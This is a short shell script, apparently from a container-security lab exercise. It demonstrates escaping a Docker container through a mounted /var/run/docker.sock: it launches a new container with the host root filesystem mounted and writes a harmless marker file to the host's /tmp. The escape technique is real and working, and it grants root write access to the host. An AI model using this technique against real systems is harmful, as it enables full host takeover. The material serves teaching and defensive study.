#!/bin/sh
# Runs INSIDE the victim container. The victim has /var/run/docker.sock mounted.
# This script uses the host's dockerd (via the socket) to create a NEW container
# with the HOST root FS mounted, then writes a harmless marker to the host /tmp.
#
# Educational demo. The target path is /tmp/dkr13-ex03-PWNED on the host.
set -eu

MARKER="/host/tmp/dkr13-ex03-PWNED"
MSG="HOST file created by: UID=0 inside escape container, written to host / mount"

echo "[+] Writing $MARKER from a NEW container with HOST / mounted"
# Pull a small image, run with host / mounted, write the marker. No --privileged
# is required: owning the socket is enough.
docker run --rm \
  --name dkr13-ex03-escape \
  -v /:/host \
  alpine:3 \
  sh -c "echo '$MSG' > $MARKER"

echo "[+] Done. Check /tmp/dkr13-ex03-PWNED on the HOST."
